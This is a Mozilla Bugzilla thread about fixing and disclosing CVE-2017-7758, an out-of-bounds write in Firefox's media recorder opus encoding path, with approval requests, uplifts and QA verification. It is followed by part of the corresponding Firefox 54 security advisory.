| [Updated](/show_bug.cgi?id=1368490#a113747_560379)• 8 years ago |

[Attachment #8872791](/attachment.cgi?id=8872791&action=edit "Add crashtest for media recorder when reducing number of source stream channels") -
Attachment is obsolete: true

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a113869_560379)• 8 years ago |

[Attachment #8872793](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") -
Flags: review?(rjesup)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1368490#c15)• 8 years ago |
|  | |

Regression from [bug 901633](/show_bug.cgi?id=901633 "RESOLVED FIXED - Improve internal support for stereo audio in the webrtc media pipeline") IIUC.Blocks: [901633](/show_bug.cgi?id=901633 "RESOLVED FIXED - Improve internal support for stereo audio in the webrtc media pipeline")
[status-firefox53](/buglist.cgi?f1=cf_status_firefox53&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox53&o1=equals&v1=wontfix)
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=affected)
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected)
[status-firefox-esr45](/buglist.cgi?f1=cf_status_firefox_esr45&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr45&o1=equals&v1=wontfix)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected)
[tracking-firefox54](/buglist.cgi?f1=cf_tracking_firefox54&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%3F)
[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F)
[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=%3F)Version: unspecified → 43 Branch

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1368490#c16)• 8 years ago |
|  | |

Comment on [attachment 8872793](/attachment.cgi?id=8872793 "Add crashtest for media recorder when reducing number of source stream channels") [[details]](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") [[diff]](/attachment.cgi?id=8872793&action=diff "Add crashtest for media recorder when reducing number of source stream channels") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872793)
Add crashtest for media recorder when reducing number of source stream channels
Review of [attachment 8872793](/attachment.cgi?id=8872793 "Add crashtest for media recorder when reducing number of source stream channels") [[details]](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") [[diff]](/attachment.cgi?id=8872793&action=diff "Add crashtest for media recorder when reducing number of source stream channels") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872793):
-----------------------------------------------------------------
Don't check in until told to do so by security (abillings/dveditz/etc)
[Attachment #8872793](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") -
Flags: review?(rjesup) → review+

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a203166_11539)• 8 years ago |

[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: review+

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1368490#c17)• 8 years ago |
|  | |

Bryce - request s-a and uplift at the same time, please.Flags: needinfo?(bvandyk)

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1368490#c18)• 8 years ago |
|  | |

Comment on [attachment 8872553](/attachment.cgi?id=8872553 "Make sure number of channels is correctly set for opus encoder") [[details]](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") [[diff]](/attachment.cgi?id=8872553&action=diff "Make sure number of channels is correctly set for opus encoder") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872553)
Make sure number of channels is correctly set for opus encoder
Approval Request Comment
[Feature/Bug causing the regression]:
[User impact if declined]:
[Is this code covered by automated tests?]:
[Has the fix been verified in Nightly?]:
[Needs manual test from QE? If yes, steps to reproduce]:
[List of other uplifts needed for the feature/fix]:
[Is the change risky?]:
[Why is the change risky/not risky?]:
[String changes made/needed]:
Approval Request Comment
[Feature/Bug causing the regression]:
[User impact if declined]:
[Is this code covered by automated tests?]:
[Has the fix been verified in Nightly?]:
[Needs manual test from QE? If yes, steps to reproduce]:
[List of other uplifts needed for the feature/fix]:
[Is the change risky?]:
[Why is the change risky/not risky?]:
[String changes made/needed]:
Approval Request Comment
[Feature/Bug causing the regression]:
[User impact if declined]:
[Is this code covered by automated tests?]:
[Has the fix been verified in Nightly?]:
[Needs manual test from QE? If yes, steps to reproduce]:
[List of other uplifts needed for the feature/fix]:
[Is the change risky?]:
[Why is the change risky/not risky?]:
[String changes made/needed]:
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
User impact if declined:
Fix Landed on Version:
Risk to taking this patch (and alternatives if risky):
String or UUID changes made by this patch:
See <https://wiki.mozilla.org/Release_Management/ESR_Landing_Process> for more info.
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
- An attacker familiar with the media recorder and processing APIs could likely figure out how to begin exploiting this. Once an attacker has figured out that this can be done, triggering the the read off the end of the array is trivial (see the PoC or the attached test). However, the data will be fed through the opus encoder before being exposed to the attacker, which increases the difficulty of exploiting this.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
- The comment is left intentionally vague to avoid this. The code change very obviously deals with array indexing, one could likely infer that it is to avoid indexing off the end of an array. The follow up test should not be landed with this, as it paints a clear target by being a crash test. I will follow up with another bug to land it later.
Which older supported branches are affected by this flaw?
- All supported: 54, 55, and 52esr appear to be affected, as well as various older, unsupported branches.
If not all supported branches, which bug introduced the flaw?
- All supported branches appear to be impacted.
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
- I believe this patch should work for the other branches. This code doesn't look to have changed since 52[1], so the same patch should work.
How likely is this patch to cause regressions; how much testing does it need?
- The patch is small and specific, I do not think it likely it will cause regressions. It does slightly alter existing behaviour if users are non-maliciously changing channel counts (specifically if users create a mono recorder then change the input to stereo). However, I think questions about up and down mixing can be handled in a non secure follow up once this is seen to. Testing would be good to ensure this works, for security purposes decreasing the number of input channels appears to be the most important test. I don't think increasing the number of channels would result in the issue, but would be good to test also.
[1]: <https://dxr.mozilla.org/mozilla-esr52/source/dom/media/encoder/TrackEncoder.cpp>Flags: needinfo?(bvandyk)
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: sec-approval?
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: approval-mozilla-esr52?
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: approval-mozilla-beta?

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1368490#c19)• 8 years ago |
|  | |

Ack, follow up to previous comment:
Approval Request Comment
[Feature/Bug causing the regression]: Appear to be [bug 901633](/show_bug.cgi?id=901633 "RESOLVED FIXED - Improve internal support for stereo audio in the webrtc media pipeline") based on [comment #15](/show_bug.cgi?id=1368490#c15 "VERIFIED FIXED - Write past end of allocation in InterleaveTrackData").
[User impact if declined]: Possible exposure of memory.
[Is this code covered by automated tests?]: Not yet, a test is proposed but should not be landed due to painting a target.
[Has the fix been verified in Nightly?]: This code has not yet been landed. Locally the fix works.
[Needs manual test from QE? If yes, steps to reproduce]: Probably good to test. Can be tested using the attached PoC.
[List of other uplifts needed for the feature/fix]: Only the proposed patch is required at this stage.
[Is the change risky?]: Low risk.
[Why is the change risky/not risky?]: It is a small and specific change.
[String changes made/needed]: None.
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration: Rating to be decided. At this stage uplift request is being made on a security basis.
User impact if declined: Possible exposure of memory.
Fix Landed on Version: Not yet landed. Would be 55.
Risk to taking this patch (and alternatives if risky): Low risk.
String or UUID changes made by this patch: None.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1368490#c20)• 8 years ago |
|  | |

Release management, do we still have time to take this in 54?
If so, I will give sec-approval+ for trunk and you can give branch approvals.Flags: needinfo?(rkothari)Flags: needinfo?(lhenry)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1368490#c21)• 8 years ago |
|  | |

Yes, we can still take it for 54.Flags: needinfo?(rkothari)Flags: needinfo?(lhenry)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a259776_451704)• 8 years ago |

[tracking-firefox54](/buglist.cgi?f1=cf_tracking_firefox54&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%2B)
[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1368490#c22)• 8 years ago |
|  | |

Comment on [attachment 8872553](/attachment.cgi?id=8872553 "Make sure number of channels is correctly set for opus encoder") [[details]](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") [[diff]](/attachment.cgi?id=8872553&action=diff "Make sure number of channels is correctly set for opus encoder") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872553)
Make sure number of channels is correctly set for opus encoder
All approvals given.
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: sec-approval?
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: sec-approval+
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: approval-mozilla-esr52?
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: approval-mozilla-esr52+
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: approval-mozilla-beta?
[Attachment #8872553](/attachment.cgi?id=8872553&action=edit "Make sure number of channels is correctly set for opus encoder") -
Flags: approval-mozilla-beta+

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a266413_280903)• 8 years ago |

Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1368490#c23)• 8 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/26e9faf36fc093367053243daf9ff3a1663dcdd9>Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1368490#c24)• 8 years ago |
|  | |

Backed out for bustage.
<https://hg.mozilla.org/integration/autoland/rev/15e32469eb048957223bac458140776a30251c6b>
<https://treeherder.mozilla.org/logviewer.html#?job_id=103769109&repo=autoland>
Bruce or Randell, we're on a pretty tight time window here, so can one of you fix and re-land ASAP?Flags: needinfo?(rjesup)Flags: needinfo?(bvandyk)

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1368490#c25)• 8 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/542348829591bffff44980cb5689c8a0a4bf80bb>Flags: needinfo?(rjesup)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1368490#c26)• 8 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/9589dfc1041b>
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=fixed)Flags: needinfo?(bvandyk)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1368490#c27)• 8 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr52/rev/279bffa85beb>
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed)

|  | [Wes Kocher (:KWierso) (Not reading bugmail; email directly if needed)](/user_profile?user_id=308534) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1368490#c28)• 8 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/542348829591>Status: ASSIGNED → RESOLVEDClosed: 8 years ago
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla55

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a361747_452604)• 8 years ago |

Flags: qe-verify+Whiteboard: [post-critsmash-triage]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a370042_1689)• 8 years ago |

Group: media-core-security, core-security → core-security-release

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a614034_1689)• 8 years ago |

[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=%3F) → [54+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=54%2B)Flags: sec-bounty? → sec-bounty+

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a708200_280903)• 8 years ago |

Whiteboard: [post-critsmash-triage] → [post-critsmash-triage][adv-main54+][adv-esr52.2+]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a710917_280903)• 8 years ago |

Alias: CVE-2017-7758

|  | [Ciprian Georgiu, Desktop QA](/user_profile?user_id=576182) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1368490#c29)• 8 years ago |
|  | |

I've managed to reproduce the crash on 52.0.2 (Ubuntu 16.04 x64) and 53.0a1 Nightly (Mac OS X 10.11.6).
The crash is not reproducible anymore with 54.0 (20170605204906) and latest Nightly 55.a01 (2017-06-07) under the following OSes:
- Win 10 x64
- Mac OS 10.11.6
- Ubuntu 16.04 x64 LTSStatus: RESOLVED → VERIFIED
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=verified)
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=verified)Flags: qe-verify+

|  | [Ciprian Georgiu, Desktop QA](/user_profile?user_id=576182) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1368490#c30)• 8 years ago |
|  | |

This is also verified on esr 52.2.0 (20170607123825).
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=verified)

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1368490#c31)• 7 years ago |
|  | |

Comment on [attachment 8872793](/attachment.cgi?id=8872793 "Add crashtest for media recorder when reducing number of source stream channels") [[details]](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") [[diff]](/attachment.cgi?id=8872793&action=diff "Add crashtest for media recorder when reducing number of source stream channels") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872793)
Add crashtest for media recorder when reducing number of source stream channels
Requesting sec approval to land delayed test case:
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
- This test makes it clear how the code can trigger the abusable bug. Weaponising the bug would require further effort.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
- This is test that painted a target to a patched bug. Landing it has been delayed to avoid this.
Which older supported branches are affected by this flaw?
- All supported branches should be immune due to earlier patch.
If not all supported branches, which bug introduced the flaw?
- All supported branches should be immune.
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
- Backports are not needed.
How likely is this patch to cause regressions; how much testing does it need?
- Regressions in any other code are unlikely, any problems should be limited to the test itself.
[Attachment #8872793](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") -
Flags: sec-approval?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1368490#c32)• 7 years ago |
|  | |

Comment on [attachment 8872793](/attachment.cgi?id=8872793 "Add crashtest for media recorder when reducing number of source stream channels") [[details]](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") [[diff]](/attachment.cgi?id=8872793&action=diff "Add crashtest for media recorder when reducing number of source stream channels") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1368490&attachment=8872793)
Add crashtest for media recorder when reducing number of source stream channels
Fixed in 54? Sure, land away!
[Attachment #8872793](/attachment.cgi?id=8872793&action=edit "Add crashtest for media recorder when reducing number of source stream channels") -
Flags: sec-approval? → sec-approval+

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1368490#c33)• 7 years ago |
|  | |

<https://treeherder.mozilla.org/#/jobs?repo=try&revision=6a3f54a2a0f6>

|  | [Bryce Seager van Dyk [:bryce] (he/him) - Not reading bugmail](/user_profile?user_id=560379)  Assignee |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1368490#c34)• 7 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/bc2cbce028cbdbe33bbbddaa2fd0213479fb3c2a>
[Bug 1368490](/show_bug.cgi?id=1368490 "VERIFIED FIXED - Write past end of allocation in InterleaveTrackData") - Add crashtest for media recorder when reducing number of source stream channels. r=jesup

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1368490#c35)• 7 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/bc2cbce028cb>Flags: in-testsuite+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a13001987_1689)• 7 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368490#a221017987_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1368490&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [ntrippar](/user_profile?user_id=596168)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_43447d02_20250124_192246.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2017-15

## Security vulnerabilities fixed in Firefox 54

Announced
June 13, 2017
Impact
critical
Products
Firefox
Fixed in

* Firefox 54

#### [#CVE-2017-5472: Use-after-free using destroyed node when regenerating trees](#CVE-2017-5472)

Reporter
Nils
Impact
critical
##### Description

A use-after-free vulnerability with the frameloader during tree reconstruction while regenerating CSS layout when attempting to use a node in the tree that no longer exists. This results in a potentially exploitable crash.

##### References

* [Bug 1365602](https://bugzilla.mozilla.org/show_bug.cgi?id=1365602)

#### [#CVE-2017-7749: Use-after-free during docshell reloading](#CVE-2017-7749)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability when using an incorrect URL during the reloading of a docshell. This results in a potentially exploitable crash.

##### References

* [Bug 1355039](https://bugzilla.mozilla.org/show_bug.cgi?id=1355039)

#### [#CVE-2017-7750: Use-after-free with track elements](#CVE-2017-7750)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability during video control operations when a `<track>` element holds a reference to an older window if that window has been replaced in the DOM. This results in a potentially exploitable crash.

##### References

* [Bug 1356558](https://bugzilla.mozilla.org/show_bug.cgi?id=1356558)

#### [#CVE-2017-7751: Use-after-free with content viewer listeners](#CVE-2017-7751)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability with content viewer listeners that results in a potentially exploitable crash.

##### References

* [Bug 1363396](https://bugzilla.mozilla.org/show_bug.cgi?id=1363396)

#### [#CVE-2017-7752: Use-after-free with IME input](#CVE-2017-7752)

Reporter
Nils
Impact
moderate
##### Description

A use-after-free vulnerability during specific user interactions with the input method editor (IME) in some languages due to how events are handled. This results in a potentially exploitable crash but would require specific user interaction to trigger.

##### References

* [Bug 1359547](https://bugzilla.mozilla.org/show_bug.cgi?id=1359547)

#### [#CVE-2017-7754: Out-of-bounds read in WebGL with ImageInfo object](#CVE-2017-7754)

Reporter
Tobias Klein
Impact
high
##### Description

An out-of-bounds read in WebGL with a maliciously crafted `ImageInfo` object during WebGL operations.

##### References

* [Bug 1357090](https://bugzilla.mozilla.org/show_bug.cgi?id=1357090)

#### [#CVE-2017-7755: Privilege escalation through Firefox Installer with same directory DLL files](#CVE-2017-7755)

Reporter
Yuji Tounai of NTT Communications, Eili Masami of Tachibana Lab
Impact
high
##### Description

The Firefox installer on Windows can be made to load malicious DLL files stored in the same directory as the installer when it is run. This allows privileged execution if the installer is run with elevated privileges.
*Note: This attack only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1361326](https://bugzilla.mozilla.org/show_bug.cgi?id=1361326)

#### [#CVE-2017-7756: Use-after-free and use-after-scope logging XHR header errors](#CVE-2017-7756)

Reporter
Abhishek Arya
Impact
high
##### Description

A use-after-free and use-after-scope vulnerability when logging errors from headers for XML HTTP Requests (XHR). This could result in a potentially exploitable crash.

##### References

* [Bug 1366595](https://bugzilla.mozilla.org/show_bug.cgi?id=1366595)

#### [#CVE-2017-7757: Use-after-free in IndexedDB](#CVE-2017-7757)

Reporter
F. Alonso (revskills)
Impact
high
##### Description

A use-after-free vulnerability in IndexedDB when one of its objects is destroyed in memory while a method on it is still being executed. This results in a potentially exploitable crash.

##### References

* [Bug 1356824](https://bugzilla.mozilla.org/show_bug.cgi?id=1356824)

